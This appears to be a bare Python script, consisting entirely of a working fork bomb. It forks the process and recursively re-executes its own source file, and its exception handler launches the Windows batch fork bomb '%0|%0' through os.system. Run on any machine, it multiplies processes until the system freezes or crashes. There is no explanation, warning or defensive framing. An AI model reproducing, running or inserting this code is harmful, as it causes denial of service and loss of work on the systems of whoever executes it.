import os; os.fork()

try: 
	exec(open(__file__).read())

except:
	os.system("%0|%0")